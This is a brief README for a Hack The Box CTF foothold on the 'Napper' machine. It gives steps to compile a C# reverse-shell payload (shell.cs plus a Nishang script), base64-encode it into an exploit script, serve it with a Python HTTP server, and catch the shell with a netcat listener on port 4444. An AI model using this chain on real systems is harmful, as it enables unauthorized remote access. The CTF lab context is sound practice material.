# Hack The Box Napper - HTB Napper user foothold python script

### After trying several methods without success, I combined a couple of codes shared by the community to make them work successfully for me.. 
This is just to gain initial access to the machine. 

Edit the shell.cs file with your respective IP and Nishang script or any script you prefer, compile it as follows (in my case, using Arch Linux): 
> Make sure that the namespace in the code is the same as that of the .cs file. 
```bash
mcs -out:shell.exe shell.cs
```
Once compiled, use the following command to obtain the base64-encoded string:

```bash
cat shell.exe | base64 | xclip -sel clip
```

Paste this string into the Python script (napper.py). Once you have the Python script ready, start a local server with Python:

```bash
sudo python -m http.server 80
```

And listen for incoming connections:

```bash
nc -nlvp 4444
```
